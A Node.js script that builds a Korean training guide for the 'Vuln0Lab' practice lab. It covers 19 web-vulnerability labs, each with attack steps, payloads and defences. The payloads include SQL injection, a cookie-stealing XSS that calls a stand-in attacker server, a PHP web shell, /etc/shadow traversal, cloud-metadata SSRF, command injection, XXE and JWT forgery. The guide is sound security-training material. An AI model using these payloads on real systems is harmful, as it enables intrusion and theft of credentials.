'use strict';
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, WidthType, ShadingType,
  PageBreak, Header, Footer, PageNumber, LevelFormat,
} = require('docx');
const fs = require('fs');

const ACCENT   = '43F0B5';
const DARK     = '0D1721';
const HEADER_BG = '1A2B3C';
const BORDER_COLOR = '203244';

const border = { style: BorderStyle.SINGLE, size: 1, color: BORDER_COLOR };
const allBorders = { top: border, bottom: border, left: border, right: border };

function h(text, level) {
  return new Paragraph({
    heading: level,
    spacing: { before: 240, after: 120 },
    children: [new TextRun({ text, bold: true, font: 'Arial' })],
  });
}

function p(text, opts = {}) {
  return new Paragraph({
    spacing: { after: 100 },
    children: [new TextRun({ text, font: 'Arial', size: 22, ...opts })],
  });
}

function code(text) {
  return new Paragraph({
    spacing: { before: 60, after: 60 },
    shading: { fill: '1E2D3D', type: ShadingType.CLEAR },
    children: [new TextRun({ text, font: 'Courier New', size: 20, color: '43F0B5' })],
  });
}

function bullet(text) {
  return new Paragraph({
    spacing: { after: 80 },
    bullet: { level: 0 },
    children: [new TextRun({ text, font: 'Arial', size: 22 })],
  });
}

function infoTable(rows) {
  return new Table({
    width: { size: 9200, type: WidthType.DXA },
    columnWidths: [2400, 6800],
    rows: rows.map(([k, v]) => new TableRow({
      children: [
        new TableCell({
          borders: allBorders,
          width: { size: 2400, type: WidthType.DXA },
          shading: { fill: HEADER_BG, type: ShadingType.CLEAR },
          margins: { top: 80, bottom: 80, left: 120, right: 120 },
          children: [new Paragraph({ children: [new TextRun({ text: k, bold: true, font: 'Arial', size: 20, color: ACCENT })] })],
        }),
        new TableCell({
          borders: allBorders,
          width: { size: 6800, type: WidthType.DXA },
          margins: { top: 80, bottom: 80, left: 120, right: 120 },
          children: [new Paragraph({ children: [new TextRun({ text: v, font: 'Arial', size: 20 })] })],
        }),
      ],
    })),
  });
}

function labSection(lab) {
  return [
    new Paragraph({ children: [new PageBreak()] }),
    h(`${lab.num}. ${lab.title}`, HeadingLevel.HEADING_2),
    new Paragraph({ spacing: { after: 120 } }),
    infoTable([
      ['카테고리', lab.cat],
      ['난이도',   lab.diff],
      ['MITRE',    lab.mitre],
      ['CWE',      lab.cwe],
    ]),
    new Paragraph({ spacing: { after: 160 } }),
    h('개요', HeadingLevel.HEADING_3),
    p(lab.desc),
    new Paragraph({ spacing: { after: 120 } }),
    h('공격 원리', HeadingLevel.HEADING_3),
    ...lab.principle.map(t => p(t)),
    new Paragraph({ spacing: { after: 120 } }),
    h('공격 시나리오 (단계별)', HeadingLevel.HEADING_3),
    ...lab.steps.map(s => bullet(s)),
    new Paragraph({ spacing: { after: 120 } }),
    h('페이로드 예시', HeadingLevel.HEADING_3),
    ...lab.payloads.map(pl => code(pl)),
    new Paragraph({ spacing: { after: 120 } }),
    h('성공 조건 / 플래그', HeadingLevel.HEADING_3),
    p(lab.flag),
    new Paragraph({ spacing: { after: 120 } }),
    h('대응 방안', HeadingLevel.HEADING_3),
    ...lab.defend.map(d => bullet(d)),
  ];
}

const LABS = [
  {
    num: 1, title: 'Union SQL Injection', cat: 'SQLi', diff: 'Easy',
    mitre: 'T1190', cwe: 'CWE-89',
    desc: '검색 입력값이 WHERE 절에 그대로 삽입됩니다. UNION SELECT를 이용해 다른 테이블 데이터를 추출합니다.',
    principle: [
      '취약한 쿼리: SELECT id, district, price FROM properties WHERE district LIKE \'%입력값%\'',
      '입력값에 UNION SELECT를 넣으면 원래 쿼리 결과와 합쳐서 출력됩니다.',
      '컬럼 수를 맞춰야 하며 이 랩은 3개 컬럼입니다.',
    ],
    steps: [
      '1단계: ORDER BY로 컬럼 수 파악 → 입력: \' ORDER BY 3 --',
      '2단계: ORDER BY 4 입력 시 오류 → 컬럼이 3개임을 확인',
      '3단계: UNION SELECT로 members 테이블 추출',
      '4단계: admin 계정의 flag 값 확인',
    ],
    payloads: [
      '\' ORDER BY 3 -- ',
      '\' UNION SELECT id, username, password FROM members -- ',
      '\' UNION SELECT id, flag, email FROM members WHERE role=\'admin\' -- ',
    ],
    flag: 'FLAG{union_admin_dump_success} 출력 시 성공',
    defend: ['Prepared Statement 사용', '입력값 화이트리스트 필터링', '에러 메시지 숨기기'],
  },
  {
    num: 2, title: 'Error-Based SQLi', cat: 'SQLi', diff: 'Medium',
    mitre: 'T1190', cwe: 'CWE-89',
    desc: 'Oracle 스타일 에러 메시지를 유도해 DB 정보를 추출합니다. 에러 내용에 데이터가 포함됩니다.',
    principle: [
      'CTXSYS.DRITHSX.SN() 함수를 이용해 에러 메시지 안에 쿼리 결과를 삽입합니다.',
      '정상 쿼리가 아닌 에러 응답에서 데이터를 읽는 기법입니다.',
    ],
    steps: [
      '1단계: COUNT(TABLE_NAME) 페이로드로 테이블 수 확인',
      '2단계: RNUM=1 조건으로 첫 번째 테이블명 확인',
      '3단계: COUNT(COLUMN_NAME)으로 컬럼 수 확인',
      '4단계: PASSWORD 키워드 포함 페이로드로 admin 비밀번호 추출',
    ],
    payloads: [
      '\' AND CTXSYS.DRITHSX.SN(user,(SELECT COUNT(TABLE_NAME) FROM USER_TABLES))=1--',
      '\' AND CTXSYS.DRITHSX.SN(user,(SELECT TABLE_NAME FROM (SELECT ROWNUM RNUM,TABLE_NAME FROM USER_TABLES) WHERE RNUM=1))=1--',
      '\' AND CTXSYS.DRITHSX.SN(user,(SELECT PASSWORD FROM members WHERE username=\'admin\'))=1--',
    ],
    flag: 'admin 비밀번호 추출 성공 시 solved 처리',
    defend: ['상세 에러 메시지 비활성화', 'Prepared Statement 사용', '최소 권한 DB 계정 사용'],
  },
  {
    num: 3, title: 'Blind SQL Injection', cat: 'SQLi', diff: 'Hard',
    mitre: 'T1190', cwe: 'CWE-89',
    desc: '결과가 직접 출력되지 않고 참/거짓만 응답합니다. ASCII/SUBSTR로 한 글자씩 비밀값을 추출합니다.',
    principle: [
      '조건이 참이면 "검색 결과 1건", 거짓이면 "검색 결과 없음"만 반환합니다.',
      'ASCII(SUBSTR(값, 위치, 1)) > 숫자 형태로 이진 탐색을 수행합니다.',
      '자동화 스크립트로 반복하면 전체 문자열을 추출할 수 있습니다.',
    ],
    steps: [
      '1단계: 참/거짓 응답 패턴 확인',
      '2단계: 비밀값 길이 파악 (힌트로 제공됨)',
      '3단계: 첫 번째 글자 ASCII 이진 탐색 시작 (> 100 → > 110 → ...)',
      '4단계: 정확한 값 찾을 때까지 반복',
    ],
    payloads: [
      '\' AND ASCII(SUBSTR((SELECT password FROM members WHERE username=\'nohsy\'),1,1)) > 100 -- ',
      '\' AND ASCII(SUBSTR((SELECT password FROM members WHERE username=\'nohsy\'),1,1)) = 98 -- ',
    ],
    flag: '첫 글자 조건 참 확인 시 solved 처리',
    defend: ['Prepared Statement 사용', '응답 시간 일정하게 유지', '동일 IP 반복 요청 차단'],
  },
  {
    num: 4, title: 'Reflected XSS', cat: 'XSS', diff: 'Easy',
    mitre: 'T1059.007', cwe: 'CWE-79',
    desc: 'GET 파라미터 q가 HTML에 그대로 삽입됩니다. 스크립트가 피해자 브라우저에서 실행됩니다.',
    principle: [
      '서버가 입력값을 이스케이프 없이 HTML에 출력합니다.',
      '공격자가 악성 URL을 피해자에게 전송하면 피해자 브라우저에서 스크립트가 실행됩니다.',
      '쿠키 탈취, 피싱 페이지 삽입에 활용됩니다.',
    ],
    steps: [
      '1단계: 검색창에 일반 텍스트 입력해서 반영 확인',
      '2단계: <script>alert("XSS")</script> 입력',
      '3단계: alert 팝업 확인',
      '4단계: document.cookie 탈취 페이로드로 확장',
    ],
    payloads: [
      '"><script>alert("XSS")</script>',
      '"><script>document.location=\'http://공격자서버/?c=\'+document.cookie</script>',
      '"><img src=x onerror=alert(1)>',
    ],
    flag: '<script> 또는 onerror= 포함 시 solved 처리',
    defend: ['출력 시 HTML 이스케이프 적용', 'Content-Security-Policy 헤더 설정', 'HttpOnly 쿠키 사용'],
  },
  {
    num: 5, title: 'Stored XSS', cat: 'XSS', diff: 'Medium',
    mitre: 'T1059.007', cwe: 'CWE-79',
    desc: '악성 스크립트가 DB에 저장되고, 다른 사용자가 페이지를 방문할 때마다 실행됩니다.',
    principle: [
      '입력값이 sanitize 없이 DB에 저장됩니다.',
      '저장된 HTML이 다른 사용자에게 그대로 렌더링됩니다.',
      'Reflected XSS보다 파급력이 크고 관리자 계정 탈취에 자주 사용됩니다.',
    ],
    steps: [
      '1단계: 댓글 입력란에 XSS 페이로드 작성',
      '2단계: 저장 버튼 클릭',
      '3단계: 페이지 새로고침 시 스크립트 재실행 확인',
      '4단계: 관리자가 방문 시 자동 실행되는 시나리오 확인',
    ],
    payloads: [
      '<script>alert("Stored XSS")</script>',
      '<img src=x onerror=alert(document.cookie)>',
      '<svg onload=alert(1)>',
    ],
    flag: 'XSS 태그 포함 댓글 저장 시 solved 처리',
    defend: ['저장 전 입력값 sanitize', '출력 시 HTML 이스케이프', 'CSP 헤더 적용'],
  },
  {
    num: 6, title: 'DOM XSS', cat: 'XSS', diff: 'Medium',
    mitre: 'T1059.007', cwe: 'CWE-79',
    desc: '서버를 거치지 않고 클라이언트 JavaScript가 location.hash를 innerHTML에 삽입합니다.',
    principle: [
      '서버 로그에 남지 않아 탐지가 어렵습니다.',
      'URL의 # 이후 값은 서버로 전송되지 않습니다.',
      'JavaScript가 document.location.hash를 innerHTML에 직접 삽입합니다.',
    ],
    steps: [
      '1단계: URL 뒤에 # 이후 페이로드 추가',
      '2단계: 페이지 로드 시 JavaScript가 hash를 innerHTML에 삽입',
      '3단계: 스크립트 실행 확인',
    ],
    payloads: [
      '/labs/xss-dom#<img src=x onerror=alert(\'dom\')>',
      '/labs/xss-dom#<script>alert(1)</script>',
    ],
    flag: 'onerror= 또는 <script 포함 hash 접근 시 solved 처리',
    defend: ['innerHTML 대신 textContent 사용', '입력값 DOMPurify로 sanitize', 'CSP 적용'],
  },
  {
    num: 7, title: '파일 업로드 취약점', cat: '파일', diff: 'Medium',
    mitre: 'T1190', cwe: 'CWE-434',
    desc: 'Content-Type만 검증하는 약한 업로드 필터를 우회해 웹쉘을 업로드합니다.',
    principle: [
      '서버가 Content-Type 헤더만 믿고 실제 파일 내용을 검사하지 않습니다.',
      'Burp Suite로 Content-Type을 image/jpeg로 바꾸면 PHP 웹쉘도 업로드됩니다.',
      '업로드된 파일이 웹에서 직접 접근 가능한 경로에 저장됩니다.',
    ],
    steps: [
      '1단계: PHP 웹쉘 파일(shell.php) 준비',
      '2단계: Burp Suite로 업로드 요청 캡처',
      '3단계: Content-Type을 image/jpeg로 변경',
      '4단계: 업로드 성공 확인 후 /static/uploads/shell.php 접근',
    ],
    payloads: [
      '파일명: shell.php',
      '내용: <?php system($_GET["cmd"]); ?>',
      'Content-Type 변경: image/jpeg',
    ],
    flag: 'PHP 파일 또는 octet-stream 업로드 시 solved 처리',
    defend: ['확장자 + 파일 시그니처 모두 검증', '업로드 경로 웹루트 외부로 설정', '실행 권한 제거'],
  },
  {
    num: 8, title: '파일 다운로드 취약점', cat: '파일', diff: 'Medium',
    mitre: 'T1005', cwe: 'CWE-22',
    desc: 'file 파라미터를 조작해 서버의 상위 디렉터리 파일을 다운로드합니다.',
    principle: [
      'path.resolve(base, 사용자입력)이 base 경로를 벗어날 수 있습니다.',
      '../를 반복해 상위 디렉터리로 이동합니다.',
      'simroot 내부의 민감 파일(/etc/passwd, .bash_history 등)에 접근 가능합니다.',
    ],
    steps: [
      '1단계: 기본값 notice.txt 다운로드 확인',
      '2단계: file=../../etc/passwd 입력',
      '3단계: passwd 파일 내용 확인',
      '4단계: ../../root/.bash_history 접근으로 다음 힌트 획득',
    ],
    payloads: [
      '../../etc/passwd',
      '../../etc/shadow',
      '../../root/.bash_history',
    ],
    flag: '../ 포함 경로 접근 시 solved 처리',
    defend: ['경로 정규화 후 base 경로 포함 여부 확인', '../ 필터링', '허용 파일 목록 화이트리스트'],
  },
  {
    num: 9, title: 'LFI / Path Traversal', cat: '파일', diff: 'Hard',
    mitre: 'T1005', cwe: 'CWE-98',
    desc: 'view 파라미터로 서버 내부 파일을 직접 읽어 화면에 출력합니다.',
    principle: [
      '파일 포함(LFI) 취약점은 사용자 입력으로 서버 파일을 불러옵니다.',
      '다운로드가 아닌 내용이 직접 화면에 표시됩니다.',
      'PHP/JSP 소스코드, 설정 파일 열람에 활용됩니다.',
    ],
    steps: [
      '1단계: 기본값 welcome.php 내용 확인',
      '2단계: ../../etc/passwd 입력으로 passwd 파일 열람',
      '3단계: ../../etc/shadow 접근 시도',
    ],
    payloads: [
      '../../etc/passwd',
      '../../etc/shadow',
      '../../root/.bash_history',
    ],
    flag: '../ 포함 경로 접근 시 solved 처리',
    defend: ['실제 경로 대신 파일 ID 사용', '허용 파일 화이트리스트', 'open_basedir 제한'],
  },
  {
    num: 10, title: 'SSRF', cat: '서버', diff: 'Hard',
    mitre: 'T1190', cwe: 'CWE-918',
    desc: '서버가 사용자 입력 URL로 요청을 보냅니다. 내부 관리자 페이지에 서버를 통해 접근합니다.',
    principle: [
      '서버가 외부 URL 미리보기 기능을 제공하며 내부 URL도 그대로 요청합니다.',
      '공격자는 서버를 프록시로 이용해 내부 네트워크에 접근합니다.',
      '소스 주석에서 내부 URL 힌트를 찾는 흐름입니다.',
    ],
    steps: [
      '1단계: http://public.lab/ 요청 → 소스 주석에서 내부 URL 발견',
      '2단계: http://internal.lab/admin 요청 → 로그인 자격증명 주석 발견',
      '3단계: http://internal.lab/admin?login_id=skinfosec_admin&login_pwd=internal_pw_2025 요청',
      '4단계: FLAG 획득',
    ],
    payloads: [
      'http://public.lab/',
      'http://internal.lab/admin',
      'http://internal.lab/admin?login_id=skinfosec_admin&login_pwd=internal_pw_2025',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    ],
    flag: 'FLAG{ssrf_internal_admin_success} 출력 시 성공',
    defend: ['허용 도메인 화이트리스트', '내부 IP 대역 차단', '서버 요청 URL 로깅/모니터링'],
  },
  {
    num: 11, title: '세션 고정 (Session Fixation)', cat: '인증', diff: 'Easy',
    mitre: 'T1539', cwe: 'CWE-384',
    desc: '공격자가 미리 정한 sessionId를 서버가 그대로 신뢰합니다.',
    principle: [
      '로그인 전 sessionId를 URL 파라미터로 심으면 서버가 그대로 세션으로 사용합니다.',
      '공격자가 피해자에게 세션 고정 링크를 전송합니다.',
      '피해자가 로그인하면 공격자는 이미 알고 있는 세션으로 계정 접근이 가능합니다.',
    ],
    steps: [
      '1단계: /labs/session-fixation/login?sessionId=eqst001004 링크 클릭',
      '2단계: 브라우저 쿠키에 lab_session=eqst001004 설정 확인',
      '3단계: /labs/session-fixation 접근 시 피해자 계정으로 로그인된 상태',
      '4단계: FLAG 확인',
    ],
    payloads: [
      '/labs/session-fixation/login?sessionId=eqst001004',
      '브라우저 DevTools → Application → Cookies → lab_session 값을 eqst001004로 수정',
    ],
    flag: 'lab_session=eqst001004 쿠키로 접근 시 solved 처리',
    defend: ['로그인 성공 시 반드시 새 세션 발급', 'URL 파라미터로 세션 수신 금지', 'HttpOnly 쿠키 사용'],
  },
  {
    num: 12, title: '파라미터 변조', cat: '인증', diff: 'Medium',
    mitre: 'T1190', cwe: 'CWE-472',
    desc: '서버가 클라이언트에서 전송한 result, role 값을 그대로 신뢰합니다.',
    principle: [
      'hidden input 또는 일반 input의 값을 브라우저 DevTools나 Burp Suite로 변조합니다.',
      '승인 여부(result)나 권한(role)을 클라이언트에서 결정하는 잘못된 설계입니다.',
    ],
    steps: [
      '1단계: F12 → Elements에서 result 값을 N에서 Y로 변경',
      '2단계: 또는 role 값을 user에서 admin으로 변경',
      '3단계: 제출 버튼 클릭',
      '4단계: FLAG 확인',
    ],
    payloads: [
      'result=Y (원래 N)',
      'role=admin (원래 user)',
      'Burp Suite Intercept → result=N → result=Y 변경 후 Forward',
    ],
    flag: 'FLAG{parameter_tampering_success} 출력 시 성공',
    defend: ['승인 로직은 서버에서만 처리', '클라이언트 값은 신뢰하지 않음', '서버 측 권한 재검증'],
  },
  {
    num: 13, title: 'IDOR (Insecure Direct Object Reference)', cat: '인증', diff: 'Medium',
    mitre: 'T1190', cwe: 'CWE-639',
    desc: 'id 파라미터만 변경하면 다른 사용자의 개인정보와 flag에 접근 가능합니다.',
    principle: [
      '객체 참조 값(id)을 직접 노출하고 접근 권한을 검증하지 않습니다.',
      'id=1이 내 계정이라면 id=2, 3, 4로 바꿔 다른 계정 정보 조회가 가능합니다.',
      'salary, email, flag 등 민감 정보가 JSON으로 노출됩니다.',
    ],
    steps: [
      '1단계: /labs/idor/api/profile?id=1 접근 (자신의 정보)',
      '2단계: id=2로 변경',
      '3단계: 다른 사용자의 flag, salary, email 확인',
      '4단계: id=4 (auditor 계정) 접근으로 최고 연봉 확인',
    ],
    payloads: [
      '/labs/idor/api/profile?id=2',
      '/labs/idor/api/profile?id=3',
      '/labs/idor/api/profile?id=4',
    ],
    flag: 'id=1 이외 접근 시 solved 처리',
    defend: ['세션 기반 소유권 검증', '직접 객체 참조 대신 간접 참조 사용', '접근 로그 모니터링'],
  },
  {
    num: 14, title: '커맨드 인젝션', cat: '인젝션', diff: 'Medium',
    mitre: 'T1059', cwe: 'CWE-78',
    desc: 'ping 명령 뒤에 세미콜론으로 추가 명령을 연결해 서버 파일을 읽습니다.',
    principle: [
      'ping 명령에 사용자 입력이 그대로 연결됩니다.',
      '; && | 등의 구분자로 추가 명령을 연결할 수 있습니다.',
      '실제 OS 명령 실행 대신 모의 쉘이 특정 패턴을 인식합니다.',
    ],
    steps: [
      '1단계: 기본값 127.0.0.1로 ping 테스트',
      '2단계: 127.0.0.1; cat flag.txt 입력',
      '3단계: FLAG 출력 확인',
      '4단계: 127.0.0.1; cat /etc/passwd 로 확장',
    ],
    payloads: [
      '127.0.0.1; cat flag.txt',
      '127.0.0.1; cat /etc/passwd',
      '127.0.0.1 && whoami',
      '127.0.0.1 | id',
    ],
    flag: 'FLAG{command_injection_chain_success} 출력 시 성공',
    defend: ['입력값에서 특수문자 완전 제거', '화이트리스트 IP 형식만 허용', 'execFile 사용 (쉘 우회)'],
  },
  {
    num: 15, title: 'XXE (XML External Entity)', cat: '인젝션', diff: 'Hard',
    mitre: 'T1005', cwe: 'CWE-611',
    desc: 'XML 외부 엔티티 선언으로 서버 내부 파일을 읽어 응답에 포함시킵니다.',
    principle: [
      'XML 파서가 외부 엔티티(SYSTEM)를 처리할 때 파일 경로를 로드합니다.',
      'file:// 프로토콜로 로컬 파일, http://로 내부 서버 접근이 가능합니다.',
      '응답에 파일 내용이 포함되어 출력됩니다.',
    ],
    steps: [
      '1단계: XXE 페이로드 작성 (file:///etc/passwd)',
      '2단계: XML 파싱 요청',
      '3단계: 응답에서 /etc/passwd 내용 확인',
      '4단계: dbinfo.properties 등 민감 파일로 확장',
    ],
    payloads: [
      '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<data>&xxe;</data>',
      '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>\n<data>&xxe;</data>',
    ],
    flag: '유효한 파일 경로 접근 시 solved 처리',
    defend: ['외부 엔티티 처리 비활성화', 'XML 파서 보안 설정 적용', 'JSON API로 대체'],
  },
  {
    num: 16, title: 'JWT 취약점', cat: '인증', diff: 'Hard',
    mitre: 'T1550.001', cwe: 'CWE-347',
    desc: '약한 secret으로 서명된 JWT를 재서명해 role을 admin으로 변경합니다.',
    principle: [
      'JWT는 header.payload.signature 구조입니다.',
      'secret이 "lab-secret"처럼 약하면 동일 secret으로 재서명이 가능합니다.',
      'payload의 role을 admin으로 바꾸고 재서명하면 관리자 권한 획득이 가능합니다.',
    ],
    steps: [
      '1단계: /labs/jwt/token 에서 샘플 토큰 발급',
      '2단계: jwt.io 또는 파이썬으로 토큰 디코딩',
      '3단계: payload의 role을 "customer"에서 "admin"으로 변경',
      '4단계: secret="lab-secret"으로 재서명',
      '5단계: 검증 창에 새 토큰 입력 → FLAG 획득',
    ],
    payloads: [
      '# Python으로 재서명',
      'import jwt',
      'token = jwt.encode({"sub":"user-201","role":"admin"}, "lab-secret", algorithm="HS256")',
    ],
    flag: 'FLAG{jwt_role_escalation_success} 출력 시 성공',
    defend: ['충분히 긴 랜덤 secret 사용 (최소 256bit)', 'alg=none 검증 차단', '토큰 만료 시간 짧게 설정'],
  },
  {
    num: 17, title: '대출 파라미터 변조 (금융)', cat: '금융', diff: 'Expert',
    mitre: 'T1648', cwe: 'CWE-472',
    desc: '금융 대출 신청 시 금리(interest)와 승인(approved) 값을 클라이언트에서 조작합니다.',
    principle: [
      '서버가 클라이언트에서 전송된 금리, 승인 여부를 그대로 신뢰합니다.',
      '실제 금융 시스템에서 발생하는 파라미터 변조 취약점을 재현합니다.',
      '이자율을 비정상적으로 높이거나 approved=Y로 변경합니다.',
    ],
    steps: [
      '1단계: 대출 신청 폼 확인 (기본값: interest=4.8, approved=N)',
      '2단계: Burp Suite로 요청 캡처',
      '3단계: interest=5000 또는 approved=Y로 변경',
      '4단계: FLAG 획득',
    ],
    payloads: [
      'interest=5000 (원래 4.8)',
      'approved=Y (원래 N)',
    ],
    flag: 'FLAG{finance_interest_manipulated} 출력 시 성공',
    defend: ['금리/승인은 서버 DB 기준으로 처리', '클라이언트 값 무시', '트랜잭션 로깅'],
  },
  {
    num: 18, title: '금융 JWT 위조 (alg=none)', cat: '금융', diff: 'Expert',
    mitre: 'T1550.001', cwe: 'CWE-345',
    desc: 'alg=none을 허용하는 잘못된 토큰 검증을 이용해 서명 없이 역할을 변경합니다.',
    principle: [
      'JWT 검증 시 alg=none이면 서명을 검증하지 않는 취약한 라이브러리가 있습니다.',
      'header의 alg를 "none"으로, payload의 role을 "auditor"로 변경합니다.',
      '서명 부분을 비우거나 아무 값으로 대체해도 통과됩니다.',
    ],
    steps: [
      '1단계: /labs/finance-jwt/token 에서 시작 토큰 받기',
      '2단계: header를 {"alg":"none","typ":"JWT"}로 base64url 인코딩',
      '3단계: payload를 {"sub":"cust-77","role":"auditor","branch":"seoul"}로 인코딩',
      '4단계: 서명 없이 header.payload. 형태로 조합',
      '5단계: 검증 창에 입력 → FLAG 획득',
    ],
    payloads: [
      '# Python',
      'import base64, json',
      'h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()',
      'p = base64.urlsafe_b64encode(json.dumps({"sub":"cust-77","role":"auditor"}).encode()).rstrip(b"=").decode()',
      'token = f"{h}.{p}."',
    ],
    flag: 'FLAG{finance_alg_none_bypass} 출력 시 성공',
    defend: ['alg=none 명시적 차단', '허용 알고리즘 화이트리스트', '서명 검증 강제화'],
  },
  {
    num: 19, title: 'DB 정보 노출 (금융)', cat: '금융', diff: 'Expert',
    mitre: 'T1552', cwe: 'CWE-200',
    desc: 'WEB-INF 설정 파일 노출로 DB 접속 정보를 획득합니다.',
    principle: [
      'Tomcat/Spring 구조에서 WEB-INF 디렉터리는 직접 접근 불가가 원칙입니다.',
      '잘못된 설정으로 WEB-INF 내부 파일이 노출되면 DB 계정 정보가 유출됩니다.',
      'web.xml → root-context.xml → dbinfo.properties 순서로 탐색합니다.',
    ],
    steps: [
      '1단계: WEB-INF/web.xml 접근 → 구조 파악',
      '2단계: WEB-INF/spring/root-context.xml 접근 → 암호화 알고리즘 확인',
      '3단계: WEB-INF/classes/dbinfo.properties 접근 → DB 계정 정보 획득',
      '4단계: jdbc.username, jdbc.password 확인',
    ],
    payloads: [
      'WEB-INF/web.xml',
      'WEB-INF/spring/root-context.xml',
      'WEB-INF/classes/dbinfo.properties',
    ],
    flag: 'dbinfo.properties 접근 시 solved 처리',
    defend: ['WEB-INF 외부 접근 차단', '설정 파일 암호화', '최소 권한 DB 계정 사용'],
  },
];

const doc = new Document({
  styles: {
    default: {
      document: { run: { font: 'Arial', size: 22, color: 'E8F1FB' } },
    },
    paragraphStyles: [
      {
        id: 'Heading1', name: 'Heading 1', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 40, bold: true, font: 'Arial', color: '43F0B5' },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 },
      },
      {
        id: 'Heading2', name: 'Heading 2', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 32, bold: true, font: 'Arial', color: '5CB8FF' },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 },
      },
      {
        id: 'Heading3', name: 'Heading 3', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 26, bold: true, font: 'Arial', color: 'F3B64F' },
        paragraph: { spacing: { before: 200, after: 120 }, outlineLevel: 2 },
      },
    ],
  },
  sections: [
    {
      properties: {
        page: {
          size: { width: 11906, height: 16838 },
          margin: { top: 1200, right: 1200, bottom: 1200, left: 1200 },
        },
      },
      headers: {
        default: new Header({
          children: [new Paragraph({
            alignment: AlignmentType.RIGHT,
            children: [new TextRun({ text: 'Vuln0Lab 공격 시나리오 가이드', font: 'Arial', size: 18, color: '95A7BB' })],
          })],
        }),
      },
      footers: {
        default: new Footer({
          children: [new Paragraph({
            alignment: AlignmentType.CENTER,
            children: [
              new TextRun({ text: '- ', font: 'Arial', size: 18, color: '95A7BB' }),
              new TextRun({ children: [PageNumber.CURRENT], font: 'Arial', size: 18, color: '95A7BB' }),
              new TextRun({ text: ' -', font: 'Arial', size: 18, color: '95A7BB' }),
            ],
          })],
        }),
      },
      children: [
        // 표지
        new Paragraph({ spacing: { before: 2000, after: 400 }, alignment: AlignmentType.CENTER,
          children: [new TextRun({ text: '⬡ VULN0LAB', font: 'Arial', size: 64, bold: true, color: '43F0B5' })],
        }),
        new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 },
          children: [new TextRun({ text: '웹 취약점 공격 시나리오 가이드', font: 'Arial', size: 40, bold: true, color: 'E8F1FB' })],
        }),
        new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 400 },
          children: [new TextRun({ text: '19개 Lab 전체 공격 방법 · 페이로드 · 대응방안', font: 'Arial', size: 24, color: '95A7BB' })],
        }),
        new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 200 },
          children: [new TextRun({ text: '⚠ 로컬 실습 전용 · 외부 시스템 공격에 사용 금지', font: 'Arial', size: 22, bold: true, color: 'FF6B7D' })],
        }),
        new Paragraph({ children: [new PageBreak()] }),

        // 목차 안내
        h('카테고리 목록', HeadingLevel.HEADING_1),
        ...['SQLi (1-3): Union / Error / Blind SQL Injection',
            'XSS (4-6): Reflected / Stored / DOM XSS',
            '파일 (7-9): 업로드 / 다운로드 / LFI',
            '서버 (10): SSRF',
            '인증 (11-13): 세션고정 / 파라미터변조 / IDOR',
            '인증 (14-16): 커맨드인젝션 / XXE / JWT',
            '금융 (17-19): 대출변조 / JWT위조 / DB정보노출',
        ].map(t => bullet(t)),

        // 각 랩
        ...LABS.flatMap(lab => labSection(lab)),
      ],
    },
  ],
});

Packer.toBuffer(doc).then(buf => {
  fs.writeFileSync('C:/vulnlab-project/Vuln0Lab_공격시나리오.docx', buf);
  console.log('완료: Vuln0Lab_공격시나리오.docx');
});
